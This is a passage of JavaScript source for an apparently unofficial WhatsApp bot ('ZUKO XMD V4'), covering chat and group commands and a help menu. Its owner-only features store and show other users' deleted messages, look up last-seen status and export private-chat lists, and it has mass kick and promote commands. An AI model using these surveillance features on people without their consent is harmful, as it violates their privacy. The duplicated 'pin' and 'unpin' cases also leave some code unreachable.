      list += `${i + 1}. @${u.split('@')[0]}\n`
      mentions.push(u)
    })
    await empire.sendMessage(m.chat, { text: list, mentions }, { quoted: m })
  }
  else {
    reply(`📝 Usage:\n${prefix}demoteexempt add @user\n${prefix}demoteexempt remove @user\n${prefix}demoteexempt list`)
  }
}
break

// ==================== ANTI-DELETE COMMANDS ====================

case 'antidelete':
case 'deleteprotect': {
  if (!isCreator) return reply('❌ Owner only')
  
  const mode = args[0]?.toLowerCase()
  const target = m.mentionedJid[0] || (m.isGroup ? m.chat : m.sender)
  
  if (!mode || !['on', 'off'].includes(mode)) {
    return reply(`🗑️ *ANTI-DELETE*\n\nUsage:\nGroup: ${prefix}antidelete on/off\nPrivate: ${prefix}antidelete pm on/off\nUser: ${prefix}antidelete user @user on/off`)
  }
  
  if (mode === 'on') {
    setSetting(target, 'antidelete', true)
    reply(`✅ Anti-delete enabled for ${m.isGroup ? 'this group' : '@' + target.split('@')[0]}`, { mentions: [target] })
  } else if (mode === 'off') {
    setSetting(target, 'antidelete', false)
    reply(`❌ Anti-delete disabled for ${m.isGroup ? 'this group' : '@' + target.split('@')[0]}`, { mentions: [target] })
  }
}
break

case 'antideletepm':
case 'pmantidelete': {
  if (!isCreator) return reply('❌ Owner only')
  
  const mode = args[0]?.toLowerCase()
  
  if (!mode || !['on', 'off'].includes(mode)) {
    return reply(`📱 *PM ANTI-DELETE*\n\nUsage: ${prefix}pmantidelete on/off\n\nWhen enabled, deleted messages in private chats will be logged.`)
  }
  
  setSetting('global', 'antideletePM', mode === 'on')
  reply(`${mode === 'on' ? '✅ Enabled' : '❌ Disabled'} anti-delete for private chats.`)
}
break

case 'antideleteglobal':
case 'globalantidelete': {
  if (!isCreator) return reply('❌ Owner only')
  
  const mode = args[0]?.toLowerCase()
  
  if (!mode || !['on', 'off'].includes(mode)) {
    return reply(`🌍 *GLOBAL ANTI-DELETE*\n\nUsage: ${prefix}globalantidelete on/off\n\nWhen enabled, deleted messages in ALL chats will be logged.`)
  }
  
  setSetting('global', 'globalantidelete', mode === 'on')
  reply(`${mode === 'on' ? '✅ Enabled' : '❌ Disabled'} global anti-delete protection.`)
}
break

case 'deletelog':
case 'viewdeleted': {
  if (!isCreator) return reply('❌ Owner only')
  
  if (!db.deletedMessages) db.deletedMessages = []
  
  const logs = db.deletedMessages.slice(-20).reverse()
  if (!logs.length) return reply('📭 No deleted message logs.')
  
  let logText = '🗑️ *RECENT DELETED MESSAGES*\n\n'
  logs.forEach((log, i) => {
    logText += `${i + 1}. 📅 ${new Date(log.time).toLocaleString()}\n`
    logText += `   👤 From: @${log.sender?.split('@')[0] || 'Unknown'}\n`
    logText += `   💬 Message: ${log.message?.substring(0, 100) || 'No text'}\n`
    if (log.media) logText += `   📎 Media: ${log.media}\n`
    logText += `   📍 Chat: ${log.isGroup ? 'Group' : 'Private'}\n\n`
  })
  
  const mentions = logs.map(l => l.sender).filter(Boolean)
  await empire.sendMessage(m.chat, {
    text: logText,
    mentions: mentions.slice(0, 50)
  }, { quoted: m })
}
break

case 'cleardeletelog':
case 'resetdeletelog': {
  if (!isCreator) return reply('❌ Owner only')
  
  if (args[0] === 'confirm') {
    db.deletedMessages = []
    saveDB()
    reply('✅ Deleted message logs cleared.')
  } else {
    reply(`⚠️ This will clear all deleted message logs. Type: ${prefix}cleardeletelog confirm`)
  }
}
break

case 'archivechat':
case 'archive': {
  if (!isCreator) return reply('❌ Owner only')
  
  let target = m.mentionedJid[0] || text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
  
  if (!target) {
    return reply(`📦 Usage: ${prefix}archive @user\n\nArchives chat with user.`)
  }
  
  try {
    await empire.chatModify({ archive: true }, target)
    reply(`✅ Chat with @${target.split('@')[0]} archived.`, { mentions: [target] })
  } catch (err) {
    reply('❌ Failed to archive chat.')
  }
}
break

case 'unarchivechat':
case 'unarchive': {
  if (!isCreator) return reply('❌ Owner only')
  
  let target = m.mentionedJid[0] || text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
  
  if (!target) {
    return reply(`📦 Usage: ${prefix}unarchive @user\n\nUnarchives chat with user.`)
  }
  
  try {
    await empire.chatModify({ archive: false }, target)
    reply(`✅ Chat with @${target.split('@')[0]} unarchived.`, { mentions: [target] })
  } catch (err) {
    reply('❌ Failed to unarchive chat.')
  }
}
break

case 'pinchat':
case 'pin': {
  if (!isCreator) return reply('❌ Owner only')
  
  let target = m.mentionedJid[0] || text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
  
  if (!target) {
    return reply(`📌 Usage: ${prefix}pin @user\n\nPins chat to top.`)
  }
  
  try {
    await empire.chatModify({ pin: true }, target)
    reply(`✅ Chat with @${target.split('@')[0]} pinned.`, { mentions: [target] })
  } catch (err) {
    reply('❌ Failed to pin chat.')
  }
}
break

case 'unpinchat':
case 'unpin': {
  if (!isCreator) return reply('❌ Owner only')
  
  let target = m.mentionedJid[0] || text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
  
  if (!target) {
    return reply(`📌 Usage: ${prefix}unpin @user\n\nUnpins chat.`)
  }
  
  try {
    await empire.chatModify({ pin: false }, target)
    reply(`✅ Chat with @${target.split('@')[0]} unpinned.`, { mentions: [target] })
  } catch (err) {
    reply('❌ Failed to unpin chat.')
  }
}
break

case 'markread':
case 'readchat': {
  if (!isCreator) return reply('❌ Owner only')
  
  let target = m.mentionedJid[0] || text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
  
  if (!target) {
    return reply(`👁️ Usage: ${prefix}read @user\n\nMarks all messages as read in chat.`)
  }
  
  try {
    await empire.readMessages([{ remoteJid: target, id: 'dummy' }])
    reply(`✅ Messages from @${target.split('@')[0]} marked as read.`, { mentions: [target] })
  } catch (err) {
    reply('❌ Failed to mark as read.')
  }
}
break

case 'deletechat':
case 'deleteconvo': {
  if (!isCreator) return reply('❌ Owner only')
  
  let target = m.mentionedJid[0] || text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
  
  if (!target) {
    return reply(`🗑️ Usage: ${prefix}deletechat @user\n\nDeletes entire chat conversation.`)
  }
  
  try {
    await empire.chatModify({ delete: true }, target)
    reply(`✅ Chat with @${target.split('@')[0]} deleted.`, { mentions: [target] })
  } catch (err) {
    reply('❌ Failed to delete chat.')
  }
}
break

case 'muteprivate':
case 'mutepm': {
  if (!isCreator) return reply('❌ Owner only')
  
  let target = m.mentionedJid[0] || text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
  
  if (!target) {
    return reply(`🔇 Usage: ${prefix}mutepm @user <duration>\n\nMutes private chat for specified hours.\nExample: ${prefix}mutepm @user 24`)
  }
  
  const duration = parseInt(args[1]) || 24 // hours
  
  if (!db.mutedPrivate) db.mutedPrivate = {}
  db.mutedPrivate[target] = Date.now() + (duration * 60 * 60 * 1000)
  saveDB()
  
  reply(`🔇 Private chat with @${target.split('@')[0]} muted for ${duration} hours.`, { mentions: [target] })
}
break

case 'unmuteprivate':
case 'unmutepm': {
  if (!isCreator) return reply('❌ Owner only')
  
  let target = m.mentionedJid[0] || text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
  
  if (!target) {
    return reply(`🔊 Usage: ${prefix}unmutepm @user\n\nUnmutes private chat.`)
  }
  
  if (db.mutedPrivate) delete db.mutedPrivate[target]
  saveDB()
  
  reply(`🔊 Private chat with @${target.split('@')[0]} unmuted.`, { mentions: [target] })
}
break

case 'presence':
case 'typingstatus': {
  if (!isCreator) return reply('❌ Owner only')
  
  let target = m.mentionedJid[0] || text.split(' ')[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
  let status = args[1]?.toLowerCase()
  
  if (!target || !status || !['typing', 'recording', 'paused'].includes(status)) {
    return reply(`📝 Usage: ${prefix}presence @user <typing|recording|paused>\n\nSimulates typing/recording status.`)
  }
  
  try {
    let presenceStatus = status === 'typing' ? 'composing' : status === 'recording' ? 'recording' : 'paused'
    await empire.sendPresenceUpdate(presenceStatus, target)
    reply(`✅ Presence "${status}" sent to @${target.split('@')[0]}`, { mentions: [target] })
  } catch (err) {
    reply('❌ Failed to send presence update.')
  }
}
break

case 'lastseen':
case 'lastonline': {
  if (!isCreator) return reply('❌ Owner only')
  
  let target = m.mentionedJid[0] || text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
  
  if (!target) {
    return reply(`⏰ Usage: ${prefix}lastseen @user\n\nChecks when user was last online.`)
  }
  
  try {
    const presence = store.presences[target]
    if (presence && presence.lastSeen) {
      const lastSeen = new Date(presence.lastSeen).toLocaleString()
      reply(`👤 @${target.split('@')[0]}\n🕐 Last seen: ${lastSeen}`, { mentions: [target] })
    } else {
      reply(`👤 @${target.split('@')[0]}\n🕐 Last seen: Unknown or currently online`, { mentions: [target] })
    }
  } catch (err) {
    reply('❌ Failed to fetch last seen.')
  }
}
break

case 'contactinfo':
case 'userinfo': {
  if (!isCreator) return reply('❌ Owner only')
  
  let target = m.mentionedJid[0] || text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
  
  if (!target) {
    return reply(`ℹ️ Usage: ${prefix}userinfo @user\n\nGets detailed user information.`)
  }
  
  try {
    let ppUrl
    try {
      ppUrl = await empire.profilePictureUrl(target, 'image')
    } catch {
      ppUrl = 'https://i.ibb.co/4f4tTnG/no-poster.png'
    }
    
    const presence = store.presences[target]
    const status = presence?.status || 'Unknown'
    const lastSeen = presence?.lastSeen ? new Date(presence.lastSeen).toLocaleString() : 'Unknown'
    
    const info = `
╭━━━━━━━━━━━━━━━━━━━━━━╮
┃    👤 𝗨𝗦𝗘𝗥 𝗜𝗡𝗙𝗢      ┃
┣━━━━━━━━━━━━━━━━━━━━━━┫
┃ 📱 Number: @${target.split('@')[0]}
┃ 📊 Status: ${status}
┃ 🕐 Last Seen: ${lastSeen}
┃ 🔗 JID: ${target}
┃ 📅 Queried: ${new Date().toLocaleString()}
┣━━━━━━━━━━━━━━━━━━━━━━┫
┃    💫 𝗭𝗨𝗞𝗢 𝗫𝗠𝗗 𝗩𝟰     ┃
╰━━━━━━━━━━━━━━━━━━━━━━╯
    `.trim()
    
    await empire.sendMessage(m.chat, {
      image: { url: ppUrl },
      caption: info,
      mentions: [target]
    }, { quoted: m })
  } catch (err) {
    reply('❌ Failed to fetch user info.')
  }
}
break

case 'privatedb':
case 'pmdb': {
  if (!isCreator) return reply('❌ Owner only')
  
  let target = m.mentionedJid[0] || text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
  
  if (!target) {
    return reply(`💾 Usage: ${prefix}pmdb @user\n\nExports private chat database for a user.`)
  }
  
  const userData = {
    jid: target,
    messages: db.messageCount?.[target] || 0,
    lastActive: db.lastActive?.[target] || null,
    isBanned: getSetting(target, 'banned', false),
    warnings: db.warnings?.[target] || 0,
    muted: db.mutedPrivate?.[target] ? new Date(db.mutedPrivate[target]).toLocaleString() : false
  }
  
  const dataFile = `./user_${target.replace(/[^0-9]/g, '')}_data.json`
  fs.writeFileSync(dataFile, JSON.stringify(userData, null, 2))
  
  await empire.sendMessage(m.chat, {
    document: fs.readFileSync(dataFile),
    mimetype: 'application/json',
    fileName: `user_${target.split('@')[0]}_data.json`,
    caption: `📦 User data for @${target.split('@')[0]}`,
    mentions: [target]
  }, { quoted: m })
  
  fs.unlinkSync(dataFile)
}
break

case 'resetprivate':
case 'resetpm': {
  if (!isCreator) return reply('❌ Owner only')
  
  let target = m.mentionedJid[0] || text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
  
  if (!target) {
    return reply(`🔄 Usage: ${prefix}resetpm @user\n\nResets all private chat data for a user.`)
  }
  
  if (args[1] !== 'confirm') {
    return reply(`⚠️ This will delete ALL data for @${target.split('@')[0]}. Type: ${prefix}resetpm @user confirm to proceed.`, { mentions: [target] })
  }
  
  // Reset user data
  if (db.messageCount) delete db.messageCount[target]
  if (db.lastActive) delete db.lastActive[target]
  if (db.warnings) delete db.warnings[target]
  if (db.xp) delete db.xp[target]
  if (db.mutedPrivate) delete db.mutedPrivate[target]
  setSetting(target, 'banned', false)
  
  saveDB()
  
  reply(`✅ All private chat data reset for @${target.split('@')[0]}.`, { mentions: [target] })
}
break

case 'exportchats':
case 'exportpm': {
  if (!isCreator) return reply('❌ Owner only')
  
  const privateChats = []
  const chats = store.chats
  
  for (const [jid, chat] of Object.entries(chats)) {
    if (jid.endsWith('@s.whatsapp.net') && !jid.includes(botNumber)) {
      privateChats.push({
        jid: jid,
        name: chat.name || jid.split('@')[0],
        messageCount: chat.messages ? Object.keys(chat.messages).length : 0
      })
    }
  }
  
  const exportFile = `./private_chats_${Date.now()}.json`
  fs.writeFileSync(exportFile, JSON.stringify(privateChats, null, 2))
  
  await empire.sendMessage(m.chat, {
    document: fs.readFileSync(exportFile),
    mimetype: 'application/json',
    fileName: 'private_chats_export.json',
    caption: `📋 Exported ${privateChats.length} private chats`
  }, { quoted: m })
  
  fs.unlinkSync(exportFile)
}
break

case 'autoreplypm':
case 'autopm': {
  if (!isCreator) return reply('❌ Owner only')
  
  const mode = args[0]?.toLowerCase()
  const message = args.slice(1).join(' ')
  
  if (!mode || !['on', 'off', 'set'].includes(mode)) {
    return reply(`📝 Usage:\n${prefix}autopm on\n${prefix}autopm off\n${prefix}autopm set <message>\n\nAuto-reply to private messages.`)
  }
  
  if (mode === 'set' && message) {
    setSetting('global', 'autoPMReply', message)
    reply(`✅ Auto-reply message set to:\n\n"${message}"`)
  }
  else if (mode === 'on') {
    setSetting('global', 'autoPM', true)
    reply('✅ Auto-reply to private messages enabled.')
  }
  else if (mode === 'off') {
    setSetting('global', 'autoPM', false)
    reply('❌ Auto-reply to private messages disabled.')
  }
}
break

case 'groupexport':
case 'exportsettings': {
  if (!m.isGroup) return reply('❌ Group only')
  if (!isCreator) return reply('❌ Owner only')
  
  const settings = {
    groupId: m.chat,
    groupName: groupMetadata?.subject,
    settings: {
      welcome: getSetting(m.chat, 'welcome', false),
      goodbye: getSetting(m.chat, 'goodbye', false),
      antilink: getSetting(m.chat, 'antilink', false),
      antibot: getSetting(m.chat, 'antibot', false),
      leveling: getSetting(m.chat, 'leveling', false),
      slowmode: getSetting(m.chat, 'slowmode', 0),
      lockmedia: getSetting(m.chat, 'lockmedia', false),
      locktext: getSetting(m.chat, 'locktext', false),
      welcomeMessage: getSetting(m.chat, 'welcomeMessage', null),
      goodbyeMessage: getSetting(m.chat, 'goodbyeMessage', null)
    },
    badwords: db.badwords?.[m.chat] || [],
    blockedDomains: db.blockedDomains?.[m.chat] || [],
    whitelist: db.whitelist?.[m.chat] || [],
    blacklist: db.blacklist?.[m.chat] || []
  }
  
  const exportFile = `./export_${m.chat.replace(/[^0-9]/g, '')}_${Date.now()}.json`
  fs.writeFileSync(exportFile, JSON.stringify(settings, null, 2))
  
  await empire.sendMessage(m.chat, {
    document: fs.readFileSync(exportFile),
    mimetype: 'application/json',
    fileName: `group_settings_${groupMetadata?.subject}.json`,
    caption: '📤 *GROUP SETTINGS EXPORT*\n\nAll settings have been exported to this file.'
  }, { quoted: m })
  
  fs.unlinkSync(exportFile)
}
break
case 'groupmember':
case 'memberlist': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  
  try {
    const metadata = await empire.groupMetadata(m.chat)
    const participants = metadata.participants
    let memberText = `👥 *MEMBERS LIST* (${participants.length})\n\n`
    const mentions = []
    
    participants.forEach((p, i) => {
      memberText += `${i + 1}. @${p.id.split('@')[0]}\n`
      mentions.push(p.id)
    })
    
    if (memberText.length > 65536) {
      reply(`👥 Total members: ${participants.length}`)
    } else {
      await empire.sendMessage(m.chat, {
        text: memberText,
        mentions: mentions
      }, { quoted: m })
    }
  } catch (err) {
    reply('❌ Failed to fetch member list.')
  }
}
break

case 'searchmember': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  if (!text) return reply(`🔍 Usage: ${prefix}searchmember <name or number>`)
  
  try {
    const metadata = await empire.groupMetadata(m.chat)
    const query = text.toLowerCase()
    const matches = metadata.participants.filter(p => 
      p.id.split('@')[0].includes(query) || 
      (p.pushName?.toLowerCase().includes(query))
    )
    
    if (!matches.length) return reply('❌ No matching members found.')
    
    let resultText = `🔍 *SEARCH RESULTS*\n\n`
    const mentions = []
    
    matches.forEach((p, i) => {
      resultText += `${i + 1}. @${p.id.split('@')[0]} - ${p.pushName || 'Unknown'}\n`
      mentions.push(p.id)
    })
    
    await empire.sendMessage(m.chat, {
      text: resultText,
      mentions: mentions
    }, { quoted: m })
  } catch (err) {
    reply('❌ Failed to search members.')
  }
}
break

case 'votekick': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  
  let target = m.mentionedJid[0]
  if (!target) return reply(`🗳️ Usage: ${prefix}votekick @user`)
  
  if (!db.votes) db.votes = {}
  if (!db.votes[m.chat]) db.votes[m.chat] = {}
  if (!db.votes[m.chat][target]) {
    db.votes[m.chat][target] = { votes: [], target: target }
  }
  
  const voteData = db.votes[m.chat][target]
  
  if (voteData.votes.includes(m.sender)) {
    return reply('⚠️ You have already voted to kick this user.')
  }
  
  voteData.votes.push(m.sender)
  saveDB()
  
  const metadata = await empire.groupMetadata(m.chat)
  const requiredVotes = Math.ceil(metadata.participants.length * 0.4) // 40% needed
  
  reply(`🗳️ Vote to kick @${target.split('@')[0]}\nVotes: ${voteData.votes.length}/${requiredVotes}`, { mentions: [target] })
  
  if (voteData.votes.length >= requiredVotes) {
    try {
      await empire.groupParticipantsUpdate(m.chat, [target], 'remove')
      delete db.votes[m.chat][target]
      saveDB()
      reply(`✅ @${target.split('@')[0]} has been removed by vote.`, { mentions: [target] })
    } catch (err) {
      reply('❌ Failed to remove user.')
    }
  }
}
break

case 'lockmedia': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  if (!isCreator) return reply('❌ Owner only')
  
  const mode = args[0]?.toLowerCase()
  
  if (!mode || !['on', 'off'].includes(mode)) {
    return reply(`📝 Usage: ${prefix}lockmedia on/off\nWhen enabled, only admins can send media.`)
  }
  
  setSetting(m.chat, 'lockmedia', mode === 'on')
  reply(`${mode === 'on' ? '✅ Enabled' : '❌ Disabled'} media lock. ${mode === 'on' ? 'Only admins can send media.' : 'All members can send media.'}`)
}
break

case 'locktext': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  if (!isCreator) return reply('❌ Owner only')
  
  const mode = args[0]?.toLowerCase()
  
  if (!mode || !['on', 'off'].includes(mode)) {
    return reply(`📝 Usage: ${prefix}locktext on/off\nWhen enabled, only admins can send text messages.`)
  }
  
  setSetting(m.chat, 'locktext', mode === 'on')
  reply(`${mode === 'on' ? '✅ Enabled' : '❌ Disabled'} text lock. ${mode === 'on' ? 'Only admins can send text.' : 'All members can send text.'}`)
}
break

case 'pinmessage':
case 'pin': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  if (!isCreator) return reply('❌ Owner only')
  
  if (!m.quoted) return reply(`📌 Reply to a message to pin it.\nUsage: ${prefix}pin`)
  
  const duration = parseInt(args[0]) || 60 // default 60 minutes
  
  if (!db.pinned) db.pinned = {}
  db.pinned[m.chat] = {
    key: m.quoted.key,
    until: Date.now() + (duration * 60 * 1000)
  }
  saveDB()
  
  reply(`📌 Message pinned for ${duration} minute(s).`)
  
  setTimeout(() => {
    if (db.pinned?.[m.chat] && Date.now() >= db.pinned[m.chat].until) {
      delete db.pinned[m.chat]
      saveDB()
    }
  }, duration * 60 * 1000)
}
break

case 'unpin': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  if (!isCreator) return reply('❌ Owner only')
  
  if (!db.pinned?.[m.chat]) return reply('❌ No pinned message in this group.')
  
  delete db.pinned[m.chat]
  saveDB()
  
  reply('📌 Message unpinned.')
}
break

case 'getpin': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  
  if (!db.pinned?.[m.chat]) return reply('❌ No pinned message in this group.')
  
  await empire.sendMessage(m.chat, {
    forward: db.pinned[m.chat].key,
    text: '📌 *Pinned Message*'
  }, { quoted: m })
}
break
case 'unbanmember':
case 'unblockuser': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  if (!isCreator) return reply('❌ Owner only')
  
  let user = m.mentionedJid[0] || text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
  if (!user) return reply(`✅ Usage: ${prefix}unbanmember @user`)
  
  if (!db.bannedMembers?.[m.chat]?.includes(user)) {
    return reply(`⚠️ @${user.split('@')[0]} is not banned from this group.`, { mentions: [user] })
  }
  
  db.bannedMembers[m.chat] = db.bannedMembers[m.chat].filter(u => u !== user)
  saveDB()
  
  reply(`✅ @${user.split('@')[0]} has been unbanned from this group.`, { mentions: [user] })
}
break

case 'bannedlist': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  if (!isCreator) return reply('❌ Owner only')
  
  const banned = db.bannedMembers?.[m.chat] || []
  if (!banned.length) return reply('✅ No banned members in this group.')
  
  let list = '🚫 *BANNED MEMBERS*\n\n'
  const mentions = []
  
  banned.forEach((user, i) => {
    list += `${i + 1}. @${user.split('@')[0]}\n`
    mentions.push(user)
  })
  
  await empire.sendMessage(m.chat, {
    text: list,
    mentions: mentions
  }, { quoted: m })
}
break

case 'warn': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  if (!isCreator) return reply('❌ Owner only')
  
  let user = m.mentionedJid[0]
  let reason = args.slice(1).join(' ') || 'No reason provided'
  
  if (!user) return reply(`⚠️ Usage: ${prefix}warn @user <reason>`)
  
  if (!db.warnings) db.warnings = {}
  if (!db.warnings[m.chat]) db.warnings[m.chat] = {}
  if (!db.warnings[m.chat][user]) db.warnings[m.chat][user] = { count: 0, reasons: [] }
  
  db.warnings[m.chat][user].count++
  db.warnings[m.chat][user].reasons.push(reason)
  saveDB()
  
  const warnCount = db.warnings[m.chat][user].count
  
  let message = `⚠️ *WARNING* ⚠️\n\n@${user.split('@')[0]} has been warned.\n📋 Reason: ${reason}\n🔢 Warning ${warnCount}/3`
  
  if (warnCount >= 3) {
    message += `\n\n❌ User has been removed from the group due to exceeding warning limit.`
    try {
      await empire.groupParticipantsUpdate(m.chat, [user], 'remove')
      delete db.warnings[m.chat][user]
      saveDB()
    } catch (err) {
      console.log('Failed to remove warned user:', err)
    }
  }
  
  await empire.sendMessage(m.chat, {
    text: message,
    mentions: [user]
  }, { quoted: m })
}
break

case 'unwarn':
case 'resetwarn': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  if (!isCreator) return reply('❌ Owner only')
  
  let user = m.mentionedJid[0] || text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
  if (!user) return reply(`🔄 Usage: ${prefix}unwarn @user`)
  
  if (!db.warnings?.[m.chat]?.[user]) {
    return reply(`✅ @${user.split('@')[0]} has no warnings.`, { mentions: [user] })
  }
  
  delete db.warnings[m.chat][user]
  saveDB()
  
  reply(`✅ Warnings reset for @${user.split('@')[0]}.`, { mentions: [user] })
}
break

case 'warnings':
case 'warnlist': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  if (!isCreator) return reply('❌ Owner only')
  
  let user = m.mentionedJid[0] || m.sender
  
  if (!db.warnings?.[m.chat]?.[user]) {
    return reply(`✅ @${user === m.sender ? 'You have' : user.split('@')[0] + ' has'} no warnings.`, 
      { mentions: [user] })
  }
  
  const data = db.warnings[m.chat][user]
  let message = `⚠️ *WARNINGS FOR @${user.split('@')[0]}* ⚠️\n\n`
  message += `📊 Total: ${data.count}/3\n\n📋 *Reasons:*\n`
  
  data.reasons.forEach((reason, i) => {
    message += `${i + 1}. ${reason}\n`
  })
  
  await empire.sendMessage(m.chat, {
    text: message,
    mentions: [user]
  }, { quoted: m })
}
break

case 'promoteall':
case 'alladmin': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  if (!isCreator) return reply('❌ Owner only')
  
  try {
    const metadata = await empire.groupMetadata(m.chat)
    const participants = metadata.participants
    let promoted = 0
    
    for (const member of participants) {
      if (!member.admin && member.id !== botNumber) {
        try {
          await empire.groupParticipantsUpdate(m.chat, [member.id], 'promote')
          promoted++
          await sleep(1000)
        } catch (err) {
          console.log(`Failed to promote ${member.id}:`, err)
        }
      }
    }
    
    reply(`✅ Promoted ${promoted} members to admin!`)
  } catch (err) {
    reply('❌ Failed to promote all members.')
  }
}
break

case 'demoteall': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  if (!isCreator) return reply('❌ Owner only')
  
  try {
    const metadata = await empire.groupMetadata(m.chat)
    const admins = metadata.participants.filter(p => p.admin && p.id !== botNumber)
    let demoted = 0
    
    for (const admin of admins) {
      try {
        await empire.groupParticipantsUpdate(m.chat, [admin.id], 'demote')
        demoted++
        await sleep(1000)
      } catch (err) {
        console.log(`Failed to demote ${admin.id}:`, err)
      }
    }
    
    reply(`✅ Demoted ${demoted} admins.`)
  } catch (err) {
    reply('❌ Failed to demote all admins.')
  }
}
break

case 'kickall': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  if (!isCreator) return reply('❌ Owner only')
  
  try {
    const metadata = await empire.groupMetadata(m.chat)
    const participants = metadata.participants
    let kicked = 0
    
    for (const member of participants) {
      if (member.id !== botNumber && !member.admin) {
        try {
          await empire.groupParticipantsUpdate(m.chat, [member.id], 'remove')
          kicked++
          await sleep(1500)
        } catch (err) {
          console.log(`Failed to kick ${member.id}:`, err)
        }
      }
    }
    
    reply(`✅ Kicked ${kicked} members from the group.`)
  } catch (err) {
    reply('❌ Failed to kick all members.')
  }
}
break
case 'menu':
case 'help':
case 'commands':
case 'allcmd': {
  const menuText = `
╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
┃       ⚡ 𝙕𝙐𝙆𝙊 𝙓𝙈𝘿 𝙈𝙀𝙉𝙐 ⚡       ┃
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃ 👤 User: ${m.pushName}
┃ 🤖 Bot: ZUKO XMD V4
┃ ⚡ Prefix: ${prefix}
┃ 📅 Date: ${new Date().toLocaleDateString()}
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃  🎮 GAMES
┃  ━━━━━━━━━━━━━━━━━━━━
┃  🎯 ${prefix}ttt - Tic Tac Toe
┃  🔤 ${prefix}hm - Hangman
┃  ❓ ${prefix}trivia - Trivia Quiz
┃  📝 ${prefix}wordle - Wordle
┃  🧮 ${prefix}math - Math Game
┃  🪨 ${prefix}rps - Rock Paper Scissors
┃  🔢 ${prefix}guessnumber - Guess Number
┃  🎲 ${prefix}dice - Roll Dice
┃  🪙 ${prefix}coinflip - Flip Coin
┃  🎰 ${prefix}slots - Slot Machine
┃  ⚓ ${prefix}bship - Battleship
┃  🔴 ${prefix}c4 - Connect 4
┃  🎮 ${prefix}games - Game List
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃  👑 GROUP MANAGEMENT
┃  ━━━━━━━━━━━━━━━━━━━━
┃  📛 ${prefix}setname / ${prefix}setgcname
┃  📝 ${prefix}setdesc / ${prefix}setdescription
┃  🔒 ${prefix}lock / ${prefix}close
┃  🔓 ${prefix}unlock / ${prefix}open
┃  👑 ${prefix}promote
┃  📉 ${prefix}demote
┃  👢 ${prefix}kick / ${prefix}remove
┃  ➕ ${prefix}add
┃  🚪 ${prefix}leave / ${prefix}left
┃  📊 ${prefix}groupinfo / ${prefix}gcinfo
┃  👥 ${prefix}admins / ${prefix}listadmins
┃  📢 ${prefix}tagall
┃  🔇 ${prefix}hidetag
┃  🔗 ${prefix}grouplink / ${prefix}invite
┃  🔄 ${prefix}resetlink / ${prefix}revoke
┃  🆔 ${prefix}groupid / ${prefix}getgid
┃  👤 ${prefix}groupowner / ${prefix}getowner
┃  📋 ${prefix}groupreport / ${prefix}reportgroup
┃  🧹 ${prefix}groupclean / ${prefix}clearchat
┃  ❄️ ${prefix}groupfreeze / ${prefix}freezegroup
┃  🚫 ${prefix}groupignore / ${prefix}ignoregroup
┃  ⭐ ${prefix}grouppriority / ${prefix}prioritygroup
┃  💾 ${prefix}groupbackupall / ${prefix}backupall
┃  📨 ${prefix}groupinviteall / ${prefix}inviteall
┃  📉 ${prefix}groupdemoteall / ${prefix}demoteallnonowner
┃  👥 ${prefix}grouproles / ${prefix}rolemanager
┃  🧪 ${prefix}groupwelcometest / ${prefix}testwelcomeall
┃  🧪 ${prefix}groupgoodbyetest / ${prefix}testgoodbyeall
┃  📅 ${prefix}groupschedule / ${prefix}schedulemsg
┃  📋 ${prefix}groupschedulelist / ${prefix}scheduledlist
┃  🗑️ ${prefix}groupscheduledelete / ${prefix}deleteschedule
┃  📢 ${prefix}groupannounce / ${prefix}announce
┃  📊 ${prefix}grouppoll / ${prefix}createpoll
┃  🗳️ ${prefix}votepoll / ${prefix}pollvote
┃  📊 ${prefix}pollresults / ${prefix}showresults
┃  🔒 ${prefix}pollclose / ${prefix}closepoll
┃  🏷️ ${prefix}setppimg / ${prefix}setgroupimage
┃  🗑️ ${prefix}removebgimg / ${prefix}delgroupimg
┃  ⏰ ${prefix}ephemeral / ${prefix}disappear
┃  🔇 ${prefix}groupmute / ${prefix}muteall
┃  🔊 ${prefix}groupunmute / ${prefix}unmuteall
┃  👑 ${prefix}addadmin / ${prefix}makeadmin
┃  👑 ${prefix}removeadmin / ${prefix}rmadmin
┃  📊 ${prefix}memberscount / ${prefix}totalmembers
┃  🔒 ${prefix}adminsonly / ${prefix}adminmode
┃  📢 ${prefix}gctag / ${prefix}mentionall
┃  🔗 ${prefix}gcinvite / ${prefix}getinvite
┃  🗑️ ${prefix}gcremove / ${prefix}cleargroup
┃  ✏️ ${prefix}grouprename / ${prefix}renamegc
┃  📝 ${prefix}groupdesc / ${prefix}setgroupdesc
┃  📊 ${prefix}groupstats / ${prefix}gcinfoall
┃  🆕 ${prefix}gccreate / ${prefix}newgroup
